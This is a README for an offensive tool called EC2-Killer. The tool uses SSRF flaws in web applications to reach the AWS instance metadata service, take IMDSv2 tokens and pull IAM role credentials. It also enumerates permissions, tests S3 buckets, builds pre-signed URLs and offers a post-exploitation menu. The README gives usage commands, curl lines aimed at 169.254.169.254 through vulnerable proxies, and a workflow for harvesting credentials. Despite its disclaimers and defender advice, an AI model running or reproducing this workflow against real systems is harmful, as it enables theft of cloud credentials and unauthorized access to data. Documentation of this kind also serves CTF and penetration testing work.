# EC2-Killer

AWS IMDSv2 Exploitation Tool - Automated credential extraction and privilege analysis through SSRF vulnerabilities.

```
  ███████╗ ██████╗██████╗     ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
  ██╔════╝██╔════╝╚════██╗    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
  █████╗  ██║      █████╔╝    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
  ██╔══╝  ██║     ██╔═══╝     ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
  ███████╗╚██████╗███████╗    ██║  ██╗██║███████╗███████╗███████╗██║  ██║
  ╚══════╝ ╚═════╝╚══════╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
```

## ⚠️ Disclaimer

**THIS TOOL IS INTENDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY**

By using this tool, you agree to:
- Only use it on systems you own or have explicit written permission to test
- Comply with all applicable laws and regulations
- Not use it for malicious purposes or unauthorized access
- Take full responsibility for any actions performed with this tool

Unauthorized access to computer systems is illegal. The authors assume no liability for misuse or damage caused by this tool.

## 🎯 Features

- **SSRF Vulnerability Testing**: Automatically detects if a proxy endpoint is vulnerable to SSRF
- **IMDSv2 Token Extraction**: Bypasses IMDSv2 protections through SSRF vulnerabilities
- **Multi-Role Enumeration**: Discovers and extracts credentials for ALL IAM roles on the instance
- **Comprehensive Permission Discovery**: Enumerates IAM policies and identifies dangerous permissions
- **S3 Bucket Discovery**: Extracts bucket names from IMDS metadata and tests access with each role
- **Pre-signed URL Generation**: Automatically generates pre-signed URLs when direct access fails
- **Interactive Menu**: Permission-based action menu for post-exploitation
- **Session Summary**: Detailed report of all findings, credentials, and recommendations

## 📋 Requirements

- Node.js 18+
- AWS CLI installed and accessible in PATH
- Network access to the target SSRF endpoint

## 🚀 Installation

```bash
git clone https://github.com/yourusername/ec2-killer.git
cd ec2-killer
npm install
```

## 💻 Usage

### Basic Usage

```bash
node killer.js <ssrf-endpoint-url>
```

### Help

```bash
node killer.js --help
node killer.js -h
```

### Examples

```bash
# Example 1: Endpoint with 'url' parameter
node killer.js http://vulnerable-site.com/proxy

# Example 2: Different endpoint name
node killer.js http://api.example.com/fetch

# Example 3: Custom path
node killer.js https://target.com/api/v1/download

# Example 4: Any vulnerable endpoint
node killer.js http://app.com/webhook
```

**The URL should point to ANY endpoint vulnerable to SSRF** that can forward requests to AWS IMDS (169.254.169.254).

### Expected Endpoint Behavior

The tool expects an SSRF-vulnerable endpoint that accepts a parameter (commonly `url`, but could be anything):

```
# Common patterns:
http://site.com/proxy?url=<target>
http://site.com/fetch?target=<target>
http://site.com/download?endpoint=<target>
http://site.com/api/load?source=<target>
```

The vulnerable endpoint should:
- Forward the request to the URL specified in the parameter
- Support both GET and PUT requests (for IMDSv2 token generation)
- Return the response from the target URL
- Be able to reach 169.254.169.254 (AWS IMDS)

**Note:** The tool automatically appends `?url=<target>` to your provided URL. If your endpoint uses a different parameter name, you may need to adjust the source code in `src/imds.js`.

## 📊 Execution Flow

1. **SSRF Vulnerability Test**: Verifies the proxy can reach IMDS
2. **IMDSv2 Token Extraction**: Obtains session token for metadata access
3. **IAM Role Enumeration**: Discovers all available IAM roles
4. **Credential Extraction**: Retrieves AWS credentials for each role
5. **IMDS Metadata Enumeration**: Recursively explores all metadata paths
6. **Credential Validation**: Tests credentials across multiple AWS regions
7. **Permission Discovery**: Enumerates IAM policies and dangerous permissions
8. **PassRole Detection**: Identifies privilege escalation vectors
9. **S3 Access Testing**: Tests S3 access with each role
10. **Bucket Discovery**: Tests bucket names found in IMDS metadata
11. **Interactive Menu**: Provides permission-based actions
12. **Summary Report**: Displays comprehensive findings

## 🔍 What Gets Extracted

### Credentials
- Access Key ID
- Secret Access Key
- Session Token
- Expiration time

### IMDS Metadata
- IAM role information
- Instance identity document
- User data
- Instance tags
- Network interfaces
- Security groups

### S3 Information
- Bucket names from metadata
- Accessible buckets per role
- Object listings
- Pre-signed URL generation commands

### Permissions
- Attached managed policies
- Inline policies
- Dangerous permission patterns
- Privilege escalation vectors

## 🎮 Interactive Menu

After credential extraction, the tool provides an interactive menu with actions based on discovered permissions:

- **EC2 Operations**: Launch/List instances
- **S3 Operations**: List buckets
- **IAM Operations**: Enumerate users/roles
- **Secrets Manager**: List secrets
- **SSM Parameter Store**: List parameters
- **Lambda**: List functions

Actions are automatically available based on the IAM permissions of the extracted credentials.

## 📁 Project Structure

```
ec2-killer/
├── killer.js              # Main entry point
├── package.json           # Dependencies
├── README.md              # This file
└── src/
    ├── config.js          # Configuration and constants
    ├── utils.js           # Logging utilities
    ├── imds.js            # IMDSv2 interaction functions
    ├── aws.js             # AWS CLI wrappers
    ├── permissions.js     # Permission enumeration
    ├── interactive.js     # Interactive menu system
    ├── presigned.js       # Pre-signed URL discovery
    ├── s3discovery.js     # S3 bucket discovery and testing
    └── summary.js         # Session summary and reporting
```

## 🔧 Configuration

Default configuration in `src/config.js`:

```javascript
export const CONFIG = {
  imdsv2: {
    baseUrl: "http://169.254.169.254",
    endpoints: {
      token: "/latest/api/token",
      iamMetadata: "/latest/meta-data/iam/security-credentials",
    },
    headers: {
      tokenTTL: "x-aws-ec2-metadata-token-ttl-seconds",
      tokenRequest: "x-aws-ec2-metadata-token",
    },
  },
  aws: {
    credentialsPath: path.join(os.homedir(), ".aws", "credentials"),
    defaultRegion: "il-central-1",
    testRegions: [
      "il-central-1",
      "us-east-1",
      "us-west-2",
      "eu-west-1",
      "ap-southeast-1",
    ],
  },
};
```

## 📝 Output

### Credentials File
Credentials are automatically written to `~/.aws/credentials`:
```ini
[default]
aws_access_key_id = ASIA...
aws_secret_access_key = abc123...
aws_session_token = IQoJ...
```

### Session Summary
At the end of execution, a comprehensive summary is displayed with:
- IMDSv2 token
- All discovered roles with credentials
- S3 access results per role
- IMDS metadata findings
- Permission enumeration results
- Recommendations

## 🛡️ CTF Usage

This tool is particularly useful for AWS-focused CTF challenges:

1. **Find SSRF**: Discover an SSRF vulnerability in the web application
2. **Run EC2-Killer**: Extract credentials from IMDS
3. **Enumerate Roles**: Tool discovers all available IAM roles
4. **Test S3 Access**: Automatically tests which role has S3 permissions
5. **Discover Buckets**: Extracts bucket names from IMDS metadata
6. **Access Objects**: Get pre-signed URLs or download commands

### Example CTF Workflow

```bash
# 1. Find SSRF endpoint (could be any path)
curl http://ctf-challenge.com/api/fetch?url=http://169.254.169.254/
# OR
curl http://ctf-challenge.com/proxy?target=http://169.254.169.254/
# OR
curl http://ctf-challenge.com/download?endpoint=http://169.254.169.254/

# 2. Run ec2-killer with the vulnerable endpoint
node killer.js http://ctf-challenge.com/api/fetch
# Note: Tool appends ?url=... by default
# If endpoint uses different param, modify src/imds.js

# 3. Tool automatically:
#    - Extracts all role credentials
#    - Tests S3 access with each role
#    - Finds bucket names in metadata
#    - Shows which role can access which bucket
#    - Provides commands to access objects
```

## 🔐 Security Considerations

### For Defenders

If you want to protect against this tool:
- Disable IMDSv1 and enforce IMDSv2 with hop limit = 1
- Use VPC endpoints with restrictive policies
- Implement egress filtering to block access to 169.254.169.254
- Use IAM role least privilege (minimal permissions)
- Enable CloudTrail logging for credential usage
- Use IMDSv2 session token TTL limits
- Implement Web Application Firewalls (WAF) to detect SSRF patterns

### For Pentesters

- Always have written authorization before testing
- Document all actions taken during testing
- Securely handle and destroy extracted credentials after testing
- Report findings responsibly
- Follow responsible disclosure practices

## 🐛 Troubleshooting

### Connection Refused
```
✗ SSRF vulnerability test failed
  Connection refused - proxy server is not reachable
```
**Solution**: Verify the proxy URL is correct and accessible

### 401 Unauthorized
```
✓ SSRF vulnerability confirmed!
✓ Proxy can reach IMDS endpoint (401 = IMDSv2 token required)
```
**This is expected** - means SSRF works and IMDSv2 is enabled

### Invalid Credentials
```
Credentials are invalid in all tested regions
```
**Possible causes**:
- Credentials expired
- Role has very limited permissions
- Region mismatch

### No S3 Access
```
✗ Role has no S3 access
```
**This is normal** - try other discovered roles or check the summary for bucket names

## 📚 API Documentation

### Main Functions

#### `testSSRFVulnerability(proxyUrl)`
Tests if the proxy endpoint is vulnerable to SSRF and can reach IMDS.

**Parameters:**
- `proxyUrl` (string): The vulnerable proxy endpoint URL

**Returns:** `boolean` - true if vulnerable

#### `fetchIMDSv2Token(proxyUrl)`
Extracts an IMDSv2 session token via the SSRF vulnerability.

**Parameters:**
- `proxyUrl` (string): The vulnerable proxy endpoint URL

**Returns:** `string` - IMDSv2 token

#### `fetchAllIAMRoles(proxyUrl, token)`
Enumerates all IAM roles available on the EC2 instance.

**Parameters:**
- `proxyUrl` (string): The vulnerable proxy endpoint URL
- `token` (string): IMDSv2 session token

**Returns:** `string[]` - Array of role names

#### `fetchCredentials(proxyUrl, token, role)`
Extracts AWS credentials for a specific IAM role.

**Parameters:**
- `proxyUrl` (string): The vulnerable proxy endpoint URL
- `token` (string): IMDSv2 session token
- `role` (string): IAM role name

**Returns:** `object` - Credentials object with AccessKeyId, SecretAccessKey, Token

#### `testS3AccessWithCredentials(roleName, accessKeyId, secretAccessKey, sessionToken)`
Tests S3 access using specific credentials.

**Parameters:**
- `roleName` (string): Name of the IAM role
- `accessKeyId` (string): AWS Access Key ID
- `secretAccessKey` (string): AWS Secret Access Key
- `sessionToken` (string): AWS Session Token

**Returns:** `object` - S3 access results with buckets and objects

#### `extractS3References(metadataMap)`
Extracts S3 bucket names and references from IMDS metadata.

**Parameters:**
- `metadataMap` (object): Map of IMDS paths to content

**Returns:** `object` - Contains bucketNames, arns, and urls arrays

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## 📄 License

MIT License - see LICENSE file for details

## 👤 Author

**@ec2Killer**

## 🙏 Acknowledgments

- AWS Security Team for IMDSv2 implementation
- Security researchers who discovered SSRF techniques
- The CTF community for AWS cloud security challenges

## 📞 Support

For issues, questions, or suggestions:
- Open an issue on GitHub
- Follow @ec2Killer on Twitter

---

**Remember**: Always obtain proper authorization before testing. Happy (ethical) hacking! 🎯
